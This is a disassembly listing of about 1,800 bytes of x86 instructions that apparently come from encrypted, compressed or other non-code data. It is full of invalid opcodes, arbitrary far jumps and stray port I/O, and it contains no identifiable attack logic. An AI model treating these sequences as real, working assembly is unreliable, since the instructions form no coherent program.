  51899a:	inc    eax
  51899b:	clc    
  51899c:	outs   dx,DWORD PTR ds:[esi]
  51899d:	inc    ebx
  51899e:	shl    BYTE PTR [ebx-0x35ef51e0],1
  5189a4:	sub    dl,BYTE PTR [esi+0x64127075]
  5189aa:	pop    edx
  5189ab:	mov    dh,0x7
  5189ad:	adc    eax,0xadeacae5
  5189b2:	pop    ecx
  5189b3:	loop   0x5189ca
  5189b5:	sti    
  5189b6:	ficom  DWORD PTR [edx]
  5189b8:	jecxz  0x5189f5
  5189ba:	lock push ds
  5189bc:	push   edi
  5189bd:	and    BYTE PTR [edi+edi*1],ch
  5189c0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5189c2:	mov    bh,0xe
  5189c4:	bnd fs ret 
  5189c7:	jne    0x518952
  5189c9:	jno    0x518a34
  5189cb:	xchg   ecx,eax
  5189cc:	cld    
  5189cd:	and    ch,BYTE PTR [edx+0x2f5e64d1]
  5189d3:	jmp    0x97ce:0x5328aae5
  5189da:	aam    0x94
  5189dc:	add    DWORD PTR [esi+0x6cbb0bb8],edx
  5189e2:	push   es
  5189e3:	sub    al,0x52
  5189e5:	push   ss
  5189e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5189e7:	test   eax,0xc1836ea2
  5189ec:	lods   eax,DWORD PTR ds:[esi]
  5189ed:	lea    ebx,[esi]
  5189ef:	inc    eax
  5189f0:	lock fwait
  5189f2:	test   DWORD PTR [ecx-0x402f34ad],ebp
  5189f8:	cmc    
  5189f9:	xlat   BYTE PTR ds:[ebx]
  5189fa:	inc    ebp
  5189fb:	dec    ecx
  5189fc:	rcr    BYTE PTR [edi+ecx*2-0x71],cl
  518a00:	(bad)  
  518a01:	idiv   dl
  518a03:	jmp    0x9c7da8aa
  518a08:	xor    esi,esi
  518a0a:	cmp    al,0x7d
  518a0c:	sbb    al,0x50
  518a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  518a0f:	ins    BYTE PTR es:[edi],dx
  518a10:	ret    0xcff5
  518a13:	sub    esp,DWORD PTR [eax]
  518a15:	repz jl 0x518a5c
  518a18:	xchg   edi,eax
  518a19:	xchg   esp,eax
  518a1a:	dec    edx
  518a1b:	in     al,dx
  518a1c:	mov    bh,BYTE PTR [ebx]
  518a1e:	lahf   
  518a1f:	fnstenv [esi-0xbba11c1]
  518a25:	add    edi,DWORD PTR [ecx]
  518a27:	mov    edi,0x72e2e5be
  518a2c:	sub    BYTE PTR [ecx],dh
  518a2e:	mov    dl,0x81
  518a30:	sbb    DWORD PTR [edi],0xffffffb1
  518a33:	or     DWORD PTR [ecx],ebp
  518a35:	imul   ecx,DWORD PTR [ecx-0x15],0x17550eff
  518a3c:	retf   0x8a75
  518a3f:	stc    
  518a40:	loop   0x518a97
  518a42:	push   0x24
  518a44:	mov    esp,0x7b149723
  518a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  518a4a:	sub    eax,0x55a7cfcc
  518a4f:	dec    ebx
  518a50:	lods   eax,DWORD PTR ds:[esi]
  518a51:	or     DWORD PTR [edi+0x2a8b63c0],esp
  518a57:	sub    al,0xf3
  518a59:	xchg   ecx,eax
  518a5a:	pusha  
  518a5b:	add    eax,0x464533f4
  518a60:	inc    ebx
  518a61:	rcl    DWORD PTR [esi+0x47cd157f],cl
  518a67:	jnp    0x518a17
  518a69:	xlat   BYTE PTR ds:[ebx]
  518a6a:	hlt    
  518a6b:	mov    bh,0xf2
  518a6d:	sub    eax,DWORD PTR [ebp*8+0x7892b910]
  518a74:	push   ss
  518a75:	jmp    0xb250:0xbbf4b63a
  518a7c:	mov    ecx,0xcdaa66f9
  518a81:	inc    BYTE PTR [esi-0x2596bb28]
  518a87:	ss sbb DWORD PTR cs:[edx-0x18f0adca],ecx
  518a8f:	mov    eax,ds:0xc17a68d5
  518a94:	pop    ebx
  518a95:	loope  0x518a31
  518a97:	in     al,0x98
  518a99:	or     BYTE PTR [edx+0x17],ah
  518a9c:	push   ds
  518a9d:	in     eax,0x7c
  518a9f:	jne    0x518a54
  518aa1:	inc    DWORD PTR [edx]
  518aa3:	das    
  518aa4:	and    BYTE PTR ds:0xee81b1,bh
  518aaa:	inc    ebp
  518aab:	ja     0x518ac0
  518aad:	mov    edi,0x4cc07634
  518ab2:	sbb    DWORD PTR [ecx+ecx*1+0x39],edi
  518ab6:	test   eax,0x2a7afb9
  518abb:	jge    0x518ac3
  518abd:	arpl   bp,si
  518abf:	pop    ebx
  518ac0:	shl    esi,1
  518ac2:	icebp  
  518ac3:	sbb    edx,eax
  518ac5:	(bad)  
  518ac6:	mov    ah,0xa5
  518ac8:	shl    BYTE PTR [eax+esi*2-0x5218369e],0x5e
  518ad0:	mov    ch,0x99
  518ad2:	hlt    
  518ad3:	pop    eax
  518ad4:	ret    
  518ad5:	jge    0x518b4a
  518ad7:	ret    
  518ad8:	test   BYTE PTR [ebx-0x4f85c69b],cl
  518ade:	addr16 out dx,al
  518ae0:	mov    ch,0x17
  518ae2:	scas   eax,DWORD PTR es:[edi]
  518ae3:	push   ss
  518ae4:	(bad)
  518ae7:	add    al,0xe1
  518ae9:	adc    bh,BYTE PTR [edx+esi*2+0x33f2bda9]
  518af0:	add    eax,0x5e1533a5
  518af5:	bswap  ebx
  518af7:	mov    eax,ds:0xf85f9648
  518afc:	jbe    0x518ab9
  518afe:	cmc    
  518aff:	cmp    al,0x9b
  518b01:	dec    esp
  518b02:	jnp    0x518ad1
  518b04:	enter  0xb33,0x18
  518b08:	or     al,0x35
  518b0a:	sub    eax,0xe6eb2d8f
  518b0f:	std    
  518b10:	jbe    0x518aa4
  518b12:	mov    eax,0xed057c03
  518b17:	and    DWORD PTR ds:0x1ccee114,eax
  518b1d:	xchg   ecx,eax
  518b1e:	in     al,0x2d
  518b20:	outs   dx,BYTE PTR ds:[esi]
  518b21:	(bad)  
  518b23:	cli    
  518b24:	mov    DWORD PTR fs:[esi],ebx
  518b27:	jno    0x518b71
  518b29:	call   0x575b4710
  518b2e:	push   ss
  518b2f:	(bad)  
  518b31:	out    0x1a,eax
  518b33:	imul   ebp,esp,0x1d
  518b36:	ret    
  518b37:	test   dh,ch
  518b39:	(bad)  
  518b3a:	shl    BYTE PTR [edx],1
  518b3c:	int    0xa5
  518b3e:	jns    0x518bb6
  518b40:	mov    al,0x92
  518b42:	das    
  518b43:	xchg   esp,eax
  518b44:	dec    DWORD PTR [ebx+eax*4+0x76]
  518b48:	pop    ebx
  518b49:	dec    eax
  518b4a:	push   ebp
  518b4b:	fstp   TBYTE PTR [ecx+edi*4+0x2e]
  518b4f:	retf   0x4a21
  518b52:	push   edx
  518b53:	push   di
  518b55:	lahf   
  518b56:	call   0x4761:0x49036709
  518b5d:	xchg   ebx,eax
  518b5e:	pusha  
  518b5f:	jae    0x518b6e
  518b61:	and    eax,DWORD PTR [edx]
  518b63:	mov    DWORD PTR [ebx+0x5],0xb25c630d
  518b6a:	out    0x63,al
  518b6c:	or     al,0x60
  518b6e:	cmp    DWORD PTR [ecx-0x2b8da619],edx
  518b74:	in     eax,dx
  518b75:	popf   
  518b76:	push   edi
  518b77:	ret    0x147f
  518b7a:	outs   dx,DWORD PTR ds:[esi]
  518b7b:	ror    ah,cl
  518b7d:	sbb    BYTE PTR [ebx+0x15],ah
  518b80:	dec    edx
  518b81:	loop   0x518bf8
  518b83:	push   ebx
  518b84:	retf   0xd909
  518b87:	fs pop edx
  518b89:	or     al,0x5f
  518b8b:	lds    eax,FWORD PTR [esi+0x35]
  518b8e:	mov    bl,0xd0
  518b90:	sbb    dl,BYTE PTR [ebp-0x4b404787]
  518b96:	fnstcw WORD PTR [edx]
  518b98:	jns    0x518bf8
  518b9a:	js     0x518b21
  518b9c:	add    eax,0xacb8dd64
  518ba1:	imul   eax,DWORD PTR [ebx],0x4b7f73fb
  518ba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  518ba8:	cwde   
  518ba9:	retf   0x1af7
  518bac:	mov    ds:0xb40a954,al
  518bb1:	(bad)  
  518bb2:	xchg   esp,eax
  518bb3:	hlt    
  518bb4:	pushf  
  518bb5:	mov    eax,0x322de430
  518bba:	push   edi
  518bbb:	mov    eax,ds:0x6488a4c7
  518bc0:	mov    dl,0x16
  518bc2:	pop    ecx
  518bc3:	pop    ebp
  518bc4:	in     al,dx
  518bc5:	icebp  
  518bc6:	push   es
  518bc7:	sbb    DWORD PTR [eax-0x62],esi
  518bca:	cmp    eax,0xcb257f8e
  518bcf:	test   WORD PTR [eax],si
  518bd2:	arpl   WORD PTR [eax],di
  518bd4:	cmp    BYTE PTR [esi],0x76
  518bd7:	jmp    0x39c22e74
  518bdc:	pop    ecx
  518bdd:	pop    ss
  518bde:	test   BYTE PTR [ebp+0x1a05d216],bh
  518be4:	(bad)  [esi+0x85cd6cc]
  518bea:	jb     0x518c48
  518bec:	jmp    0x5c1f:0xa5da6445
  518bf3:	adc    dh,cl
  518bf5:	jo     0x518c5c
  518bf7:	fimul  DWORD PTR [edx+0x34fc2b66]
  518bfd:	pop    esp
  518bfe:	adc    BYTE PTR [esi+0x4c6b3fd8],dl
  518c04:	pop    esp
  518c05:	mov    ebx,0xcefa5061
  518c0a:	xor    ebp,DWORD PTR [ebx]
  518c0c:	adc    DWORD PTR [eax-0x57],ebp
  518c0f:	or     ebp,DWORD PTR [ecx]
  518c11:	ret    
  518c12:	pushf  
  518c13:	mov    esp,0x51c4493b
  518c18:	fwait
  518c19:	lea    esp,[edi-0x9]
  518c1c:	mov    ebp,ebp
  518c1e:	fbstp  TBYTE PTR [ebx+0x76]
  518c21:	test   al,ch
  518c23:	mov    ds:0x7a1a642a,al
  518c28:	add    BYTE PTR [ecx+0x4ca6a257],al
  518c2e:	jne    0x518c2f
  518c30:	hlt    
  518c31:	push   ecx
  518c32:	loope  0x518c69
  518c34:	xchg   ebx,eax
  518c35:	in     eax,0x36
  518c37:	dec    esp
  518c38:	test   BYTE PTR [edi-0x78],ah
  518c3b:	push   ds
  518c3c:	or     eax,0xd293ed26
  518c41:	add    DWORD PTR [edx+0x18],0x55
  518c45:	push   ebp
  518c46:	in     eax,dx
  518c47:	les    di,DWORD PTR ds:0xadcb6240
  518c4e:	xchg   edi,eax
  518c4f:	sbb    DWORD PTR [ecx],0xffffffdb
  518c52:	fmul   DWORD PTR [ebx-0x5803d8a4]
  518c58:	pushf  
  518c59:	sbb    dh,BYTE PTR [esi]
  518c5b:	(bad)  
  518c5c:	fcom   DWORD PTR [eax]
  518c5e:	push   gs
  518c60:	xchg   ebp,eax
  518c61:	fistp  DWORD PTR [eax-0x4]
  518c64:	sbb    al,0x6f
  518c66:	cli    
  518c67:	inc    eax
  518c68:	adc    ebp,DWORD PTR [edi-0x22070fc1]
  518c6e:	clc    
  518c6f:	(bad)  
  518c71:	mov    esi,0x1361f31
  518c76:	push   esi
  518c77:	sub    DWORD PTR [ebp-0x22],ecx
  518c7a:	leave  
  518c7b:	xor    ebx,DWORD PTR [eax+0x5b]
  518c7e:	inc    eax
  518c7f:	adc    cl,ch
  518c81:	pop    esp
  518c82:	fadd   DWORD PTR [ebx-0x6957545]
  518c88:	jl     0x518cfc
  518c8a:	cmp    ah,BYTE PTR [esi+0x47142a72]
  518c90:	pop    es
  518c91:	leave  
  518c92:	out    0xec,al
  518c94:	jb     0x518c48
  518c96:	pop    esp
  518c97:	(bad)
  518c9a:	sub    ebp,DWORD PTR [edi-0x67]
  518c9d:	xor    DWORD PTR [ebx],ecx
  518c9f:	pop    eax
  518ca0:	xchg   ebp,eax
  518ca1:	or     dh,dh
  518ca3:	mov    eax,DWORD PTR [edx]
  518ca5:	mov    dh,0x2d
  518ca7:	rcl    DWORD PTR [esi+0x2a],1
  518caa:	and    ecx,eax
  518cac:	and    DWORD PTR [ecx],esp
  518cae:	mov    ecx,0xb77f4ab2
  518cb3:	push   ds
  518cb4:	mov    BYTE PTR [eax+0x5c757c11],dl
  518cba:	pop    ecx
  518cbb:	fcom   st(7)
  518cbd:	rcr    DWORD PTR [esi],1
  518cbf:	pop    esi
  518cc0:	jne    0x518d16
  518cc2:	or     DWORD PTR ds:0x82bfdf7,edi
  518cc8:	sub    al,0x8a
  518cca:	lods   al,BYTE PTR ds:[esi]
  518ccb:	cmp    BYTE PTR [edi-0x79],0xfd
  518ccf:	cdq    
  518cd0:	mov    ebx,0x20eb4689
  518cd5:	fstp   DWORD PTR [ebp-0x61]
  518cd8:	test   al,0x80
  518cda:	dec    esi
  518cdb:	dec    ebx
  518cdc:	jmp    0x9e6c9ee7
  518ce1:	adc    eax,0xed0c0cb5
  518ce6:	(bad)  
  518ce7:	cli    
  518ce8:	in     al,dx
  518ce9:	jns    0x518d2e
  518ceb:	in     eax,0x55
  518ced:	frstor [edx+ebp*2+0x70]
  518cf1:	jo     0x518d4a
  518cf3:	xchg   ecx,eax
  518cf4:	add    BYTE PTR [esi],dh
  518cf6:	mov    eax,0x83e1b840
  518cfb:	ja     0x518cad
  518cfd:	lahf   
  518cfe:	inc    ebx
  518cff:	and    eax,edx
  518d01:	popf   
  518d02:	cmp    BYTE PTR cs:[eax-0x2c],bl
  518d06:	adc    eax,0x4c6539cb
  518d0b:	mov    bh,0x0
  518d0d:	fdivr  DWORD PTR [ecx-0xf2d15ce]
  518d13:	and    eax,0xfbcf256c
  518d18:	sbb    DWORD PTR [esi+esi*2+0x7272b6f0],0xe10de28e
  518d23:	push   ebp
  518d24:	mov    ds:0x85743d6f,eax
  518d29:	in     eax,dx
  518d2a:	push   edx
  518d2b:	xchg   esi,eax
  518d2c:	in     al,dx
  518d2d:	mov    esp,0x20f7513
  518d32:	xchg   esp,eax
  518d33:	lods   al,BYTE PTR ds:[esi]
  518d34:	arpl   WORD PTR [edx+0x1f],ax
  518d37:	fucomi st,st(0)
  518d39:	mov    ecx,?
  518d3b:	cmp    bl,bl
  518d3d:	xchg   esi,eax
  518d3e:	(bad)  
  518d3f:	and    eax,eax
  518d41:	mov    dh,0xec
  518d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  518d44:	fwait
  518d45:	pop    ss
  518d46:	and    eax,0x775bfe1f
  518d4b:	cmp    eax,0x23f4269a
  518d50:	or     eax,0x4cecaaf
  518d55:	xor    DWORD PTR [esi-0x51],ebp
  518d58:	fild   WORD PTR [ecx+0x61]
  518d5b:	std    
  518d5c:	sbb    BYTE PTR [edx-0x2d6a5c8a],dh
  518d62:	nop
  518d63:	out    0xa8,al
  518d65:	idiv   ebp
  518d67:	pop    esp
  518d68:	jne    0x518d45
  518d6a:	stos   BYTE PTR es:[edi],al
  518d6b:	retf   
  518d6c:	jmp    0x33d:0x61fef53e
  518d73:	cdq    
  518d74:	mov    DWORD PTR [ecx],esp
  518d76:	sahf   
  518d77:	xchg   esi,eax
  518d78:	and    al,0x85
  518d7a:	mov    esp,0x575c03b0
  518d7f:	icebp  
  518d80:	sub    edx,DWORD PTR [ebx]
  518d82:	or     eax,0xb022f397
  518d87:	pop    es
  518d88:	pop    esp
  518d89:	outs   dx,DWORD PTR ds:[esi]
  518d8a:	bnd ja 0x518d47
  518d8d:	dec    eax
  518d8e:	and    al,BYTE PTR [esi]
  518d90:	mov    ds:0xf27dda0c,al
  518d95:	or     DWORD PTR [ecx+0x41],0x34
  518d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  518d9a:	xor    esi,DWORD PTR [edi-0xc]
  518d9d:	adc    eax,0x5bbc6af1
  518da2:	push   ecx
  518da3:	push   ss
  518da4:	xchg   DWORD PTR [edx+0x5f0e4ebe],edi
  518daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  518dab:	dec    esi
  518dac:	fnsave [edx+0x75]
  518daf:	pop    ecx
  518db0:	scas   eax,DWORD PTR es:[edi]
  518db1:	dec    ebx
  518db2:	dec    eax
  518db3:	addr16 add edi,ebp
  518db6:	jno    0x518d94
  518db8:	clc    
  518db9:	test   BYTE PTR es:[edx],al
  518dbc:	adc    BYTE PTR [eax+0x34bad34f],bl
  518dc2:	shl    BYTE PTR [ebx],1
  518dc4:	test   eax,0x9ea1efcf
  518dc9:	or     DWORD PTR [ebp-0x66],esp
  518dcc:	aam    0xc
  518dce:	sahf   
  518dcf:	add    al,0xa5
  518dd1:	nop
  518dd2:	add    bl,BYTE PTR [edi-0x4b]
  518dd5:	or     eax,0x37385465
  518dda:	jmp    0xdfc:0xf6ff6593
  518de1:	or     ebp,DWORD PTR [eax+0x4a0344c2]
  518de7:	loope  0x518dd6
  518de9:	pop    edi
  518dea:	jae    0x518d8d
  518dec:	mov    BYTE PTR [edx-0x67d8f2c9],ah
  518df2:	out    dx,al
  518df3:	dec    eax
  518df4:	sub    eax,DWORD PTR [ecx]
  518df6:	mov    bl,0x1a
  518df8:	in     eax,0xc8
  518dfa:	adc    eax,0xe7daf015
  518dff:	je     0x518de4
  518e01:	mov    ah,0x6a
  518e03:	push   ss
  518e04:	mov    BYTE PTR [edi+0x1bb4ed31],ch
  518e0a:	add    dl,BYTE PTR [ecx+0x11]
  518e0d:	jle    0x518e02
  518e0f:	(bad)  
  518e10:	hlt    
  518e11:	ds and ch,bl
  518e14:	jnp    0x518e58
  518e16:	aas    
  518e17:	adc    edi,DWORD PTR [edx+0x2c]
  518e1a:	mov    esi,0x59512823
  518e1f:	sub    DWORD PTR [edx-0x54],edi
  518e22:	and    al,BYTE PTR [eax-0x33905fa1]
  518e28:	mov    ebx,0x550e28b1
  518e2d:	dec    edi
  518e2e:	jge    0x518dbd
  518e30:	or     al,0x28
  518e32:	jge    0x518e64
  518e34:	dec    edi
  518e35:	jb     0x518df8
  518e37:	fisub  DWORD PTR [ecx-0x194b1e17]
  518e3d:	jp     0x518e26
  518e3f:	mov    ds:0x40faa534,eax
  518e44:	dec    ecx
  518e45:	mov    ah,BYTE PTR [edi-0x199b080d]
  518e4b:	stos   DWORD PTR es:[edi],eax
  518e4c:	push   eax
  518e4d:	dec    edi
  518e4e:	sub    DWORD PTR [ebx-0x20bd169c],0x4e
  518e55:	xor    al,0x6c
  518e57:	stos   BYTE PTR es:[edi],al
  518e58:	sub    eax,0xea2cbff5
  518e5d:	in     eax,dx
  518e5e:	jecxz  0x518e61
  518e60:	popf   
  518e61:	shr    al,1
  518e63:	xlat   BYTE PTR ds:[ebx]
  518e64:	fdiv   DWORD PTR [edi-0x7d]
  518e67:	inc    ebp
  518e68:	std    
  518e69:	jne    0x518ebd
  518e6b:	mov    bh,0xa1
  518e6d:	int3   
  518e6e:	inc    edi
  518e6f:	xor    BYTE PTR [edi],0x62
  518e72:	and    eax,0x452ce7a7
  518e77:	jmp    FWORD PTR [esi+eax*4]
  518e7a:	jae    0x518ec7
  518e7c:	inc    eax
  518e7d:	aaa    
  518e7e:	xor    al,0xd5
  518e80:	mov    BYTE PTR [ecx-0x7b],dh
  518e83:	pop    ecx
  518e84:	test   DWORD PTR [ecx+0x78],edx
  518e87:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  518e89:	lods   eax,DWORD PTR ds:[esi]
  518e8a:	shl    BYTE PTR [edi+0x5a5cef1d],cl
  518e90:	mov    ch,0xf9
  518e92:	and    DWORD PTR [ecx+edi*8-0x24efc8c],ebx
  518e99:	and    DWORD PTR ds:0x86d1270d,edi
  518e9f:	push   cs
  518ea0:	mov    bl,0x1a
  518ea2:	add    al,0x85
  518ea4:	jl     0x518e3a
  518ea6:	in     al,0x73
  518ea8:	jns    0x518e64
  518eaa:	push   edi
  518eab:	pop    ebp
  518eac:	mov    DWORD PTR [edx],ebx
  518eae:	lods   eax,DWORD PTR ds:[esi]
  518eaf:	xor    eax,DWORD PTR [edx]
  518eb1:	lds    edi,FWORD PTR ds:0xf690cb87
  518eb7:	sub    BYTE PTR [edx+0x68f368e6],ah
  518ebd:	jecxz  0x518ef2
  518ebf:	push   edx
  518ec0:	out    dx,eax
  518ec1:	pop    edi
  518ec2:	gs jbe 0x518ec4
  518ec5:	mov    DWORD PTR [esi-0x720c6110],esi
  518ecb:	adc    edi,DWORD PTR [ecx+0x2f]
  518ece:	pop    ds
  518ecf:	cwde   
  518ed0:	scas   eax,DWORD PTR es:[edi]
  518ed1:	xchg   ebp,eax
  518ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  518ed3:	mov    bh,0x6e
  518ed5:	add    al,0xea
  518ed7:	pop    eax
  518ed8:	mov    esi,0x8e23f475
  518edd:	fdiv   st,st(1)
  518edf:	dec    edx
  518ee0:	lahf   
  518ee1:	sub    BYTE PTR [ecx-0x47],0x33
  518ee5:	dec    esi
  518ee6:	sbb    BYTE PTR [esi],bh
  518ee8:	adc    eax,0x705f6d07
  518eed:	dec    ebp
  518eee:	dec    edi
  518eef:	in     al,dx
  518ef0:	sub    eax,0xedb0712c
  518ef5:	adc    BYTE PTR [esi],0x2
  518ef8:	pushf  
  518ef9:	xchg   ebx,eax
  518efa:	(bad)  
  518efb:	lods   eax,DWORD PTR ds:[esi]
  518efc:	jbe    0x518f4a
  518efe:	ds in  eax,dx
  518f00:	fdivp  st(0),st
  518f02:	and    eax,0xb2347c3d
  518f07:	adc    al,0xf5
  518f09:	xlat   BYTE PTR ds:[ebx]
  518f0a:	retf   
  518f0b:	popf   
  518f0c:	gs in  eax,0xaa
  518f0f:	inc    ebp
  518f10:	retf   0xd9f0
  518f13:	ja     0x518f3c
  518f15:	aad    0xe7
  518f17:	xor    DWORD PTR [edi+edx*1],edi
  518f1a:	jecxz  0x518f5f
  518f1c:	mov    al,0x52
  518f1e:	mov    al,ds:0x761f0285
  518f23:	(bad)  
  518f24:	jns    0x518f2a
  518f26:	and    esi,DWORD PTR [ebx]
  518f28:	retf   
  518f29:	mov    eax,ds:0xd3ab53fc
  518f2e:	jg     0x518f36
  518f30:	sbb    esi,ebp
  518f32:	popa   
  518f33:	mov    edi,0x40500854
  518f38:	push   esp
  518f39:	lds    ecx,FWORD PTR [ecx+0x67c05adc]
  518f3f:	sbb    eax,DWORD PTR [ebp-0x18]
  518f42:	push   0xffffffe0
  518f44:	push   es
  518f45:	popa   
  518f46:	mov    ?,WORD PTR [esi+0x4e]
  518f49:	pop    esp
  518f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  518f4b:	into   
  518f4c:	das    
  518f4d:	(bad)  
  518f4e:	outs   dx,DWORD PTR ds:[esi]
  518f4f:	ret    
  518f50:	mov    al,0x66
  518f52:	pop    ds
  518f53:	xchg   ebp,eax
  518f54:	iret   
  518f55:	cmp    eax,0xf87b2dd4
  518f5a:	pop    edi
  518f5b:	push   ds
  518f5c:	cmp    ch,ch
  518f5e:	mov    dh,0xb6
  518f60:	dec    esi
  518f61:	jecxz  0x518f49
  518f63:	mov    bl,0xb2
  518f65:	and    eax,0x2ef2466e
  518f6a:	outs   dx,DWORD PTR ds:[esi]
  518f6b:	pop    ds
  518f6c:	movsx  eax,WORD PTR [edx]
  518f6f:	imul   edi,ecx,0x8e6934af
  518f75:	out    0x78,eax
  518f77:	push   ebx
  518f78:	dec    edx
  518f79:	aam    0xbd
  518f7b:	bound  ebx,QWORD PTR [ecx-0x7e1c7cbb]
  518f81:	test   esi,edi
  518f83:	adc    edi,DWORD PTR [edx-0x64]
  518f86:	data16 (bad) 
  518f88:	sbb    ebp,DWORD PTR [ecx-0x33]
  518f8b:	lock fdiv QWORD PTR [edx]
  518f8e:	sbb    al,0x68
  518f90:	ret    0x5306
  518f93:	das    
  518f94:	and    BYTE PTR [ebx],dh
  518f96:	mov    WORD PTR [ecx-0x6dcbe33b],?
  518f9c:	and    BYTE PTR [edx+0x42d8256b],0x33
  518fa3:	jge    0x518f38
  518fa5:	push   0x6e040310
  518faa:	std    
  518fab:	cmp    ebp,esp
  518fad:	xchg   esi,eax
  518fae:	mov    esi,0xe93d0d0d
  518fb3:	fld    TBYTE PTR cs:[edx+0x4e6347fb]
  518fba:	aad    0x78
  518fbc:	rcl    DWORD PTR [ecx+0x1fe75ea8],1
  518fc2:	sbb    al,dl
  518fc4:	mov    dl,0x49
  518fc6:	repnz xchg ebx,eax
  518fc8:	jno    0x518f8e
  518fca:	mov    ch,BYTE PTR [eax-0x4d]
  518fcd:	mov    edx,0xd64d8689
  518fd2:	mov    eax,ds:0x2ae7fd47
  518fd7:	into   
  518fd8:	ja     0x518ffe
  518fda:	enter  0xb108,0x9b
  518fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  518fdf:	sub    esp,DWORD PTR [edi-0x132fb732]
  518fe5:	dec    edi
  518fe6:	add    ecx,eax
  518fe8:	jmp    0x518f79
  518fea:	enter  0xdd17,0xc4
  518fee:	gs mov esp,0x6d12361a
  518ff4:	xchg   ebx,eax
  518ff5:	jnp    0x519010
  518ff7:	mov    ah,0xea
  518ff9:	adc    DWORD PTR [esi],eax
  518ffb:	jns    0x518fbe
  518ffd:	inc    ebp
  518ffe:	fidiv  DWORD PTR [eax-0x721393cb]
  519004:	push   es
  519005:	push   edx
  519006:	inc    edi
  519007:	out    dx,al
  519008:	leave  
  519009:	call   0x1672:0x52f30bdd
  519010:	neg    al
  519012:	addr16 push edx
  519014:	imul   ebp,DWORD PTR [esi+0x59],0xeecd9468
  51901b:	fwait
  51901c:	inc    esi
  51901d:	iret   
  51901e:	mov    esp,0xd5ecf3cf
  519023:	or     DWORD PTR [ebp-0x5d],ecx
  519026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  519027:	mov    cl,0x43
  519029:	xchg   esi,eax
  51902a:	xor    esi,eax
  51902c:	(bad)  
  51902d:	xor    eax,0xdd75bbe1
  519032:	(bad)  
  519033:	aaa    
  519034:	(bad)  
  519035:	arpl   WORD PTR [edi-0x5a],ax
  519038:	xchg   DWORD PTR [edi-0x4fb81b9],esp
  51903e:	ja     0x518ffa
  519040:	and    ah,cl
  519042:	out    0x4b,eax
  519044:	adc    eax,0x60123a41
  519049:	cld    
  51904a:	mov    bl,0xf2
  51904d:	sub    DWORD PTR [ebp+0x3d],esi
  519050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  519051:	sub    eax,0xf280ebb1
  519056:	inc    edx
  519057:	push   ebx
  519058:	and    BYTE PTR [edx-0x39d5de0f],0x8b
  51905f:	and    ecx,ebx
  519061:	jne    0x5190de
  519063:	pop    ebp
  519064:	inc    ecx
  519065:	es clc 
  519067:	mov    DWORD PTR [edx],eax
  519069:	dec    edi
  51906a:	xor    al,bl
  51906c:	mov    ecx,0x3cc9ad40
  519071:	cs add eax,0x321e817a
  519077:	aam    0xab
  519079:	dec    esi
  51907a:	pop    ds
  51907b:	in     eax,dx
  51907c:	mov    eax,0xb7667bdf
  519081:	pop    edi
  519082:	mov    ds:0x14a083ed,eax
  519087:	loopne 0x5190d3
  519089:	jl     0x5190ee
  51908b:	pop    eax
  51908c:	sub    edx,eax
  51908e:	push   eax
  51908f:	mov    esi,0x93cd8664
  519094:	pop    ebp
  519095:	in     eax,dx
  519096:	xor    ebx,DWORD PTR [ebx-0x7aae9234]
  51909c:	imul   edi,DWORD PTR [ecx-0x514497c9],0x9344b54e
  5190a6:	sub    al,0x8e
  5190a8:	ins    DWORD PTR es:[edi],dx
  5190a9:	test   BYTE PTR [ebp+0x3b3acbe0],0x4e
  5190b0:	repz neg BYTE PTR [eax-0x562d778f]
  5190b7:	add    bl,BYTE PTR [edx+0x35742fef]
  5190bd:	rcl    BYTE PTR [eax-0x998e2fb],1
  5190c3:	js     0x5190aa
  5190c5:	pop    esp
  5190c6:	clc    
  5190c7:	mov    edx,0xa420a065
  5190cc:	in     eax,0x77
  5190ce:	shl    BYTE PTR [edi-0x468ce8f1],cl
  5190d4:	cmp    eax,0xce098558
  5190d9:	aad    0xef
  5190db:	push   cs
  5190dc:	ja     0x5190a9
  5190de:	jb     0x519124
  5190e0:	xchg   BYTE PTR [ebx+ecx*4],cl
  5190e3:	rol    BYTE PTR [edx+0x22],cl
  5190e6:	(bad)  
  5190e7:	js     0x519141
  5190e9:	popf   
  5190ea:	jo     0x519139
  5190ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5190ed:	loopne 0x519115
  5190ef:	sub    eax,esp
  5190f1:	push   es
  5190f2:	imul   ecx,ebp,0x7c
  5190f5:	dec    esp
  5190f6:	sar    BYTE PTR [eax+0x6a4fbcc3],1
  5190fc:	push   cs
  5190fd:	push   0xcd86c027
  519102:	lods   al,BYTE PTR ds:[esi]
  519103:	jo     0x519178
  519105:	retf   
  519106:	lea    edx,[edx-0x34f23007]
  51910c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51910d:	call   0x71b08443
  519112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  519113:	mov    edi,0x81267c1b
  519118:	xlat   BYTE PTR ds:[ebx]
  519119:	jo     0x51914c
  51911b:	adc    al,0x59
  51911d:	mov    ds:0xec011923,eax
  519122:	stc    
  519123:	sub    al,0x6e
  519125:	or     bl,BYTE PTR [edi-0x5caa2f00]
  51912b:	imul   di,ax,0x4d
  51912f:	xchg   edi,eax
  519130:	push   cs
  519131:	cmp    eax,0x82f987
  519136:	jmp    0xe05a:0x6790b4ea
  51913d:	push   edx
  51913e:	and    bh,BYTE PTR [edi]
  519140:	sub    BYTE PTR [edi+0x1a37956],bl
  519146:	sub    al,0xef
  519148:	inc    edi
  519149:	mov    eax,ds:0xa93faf1
  51914e:	sub    DWORD PTR [ebx],esi
  519150:	push   DWORD PTR [eax]
  519152:	xchg   ebx,eax
  519153:	pop    ebx
  519154:	shl    DWORD PTR [ecx+0x3669c7f0],0x1d
  51915b:	ja     0x51914b
  51915d:	jmp    0x5530c3df
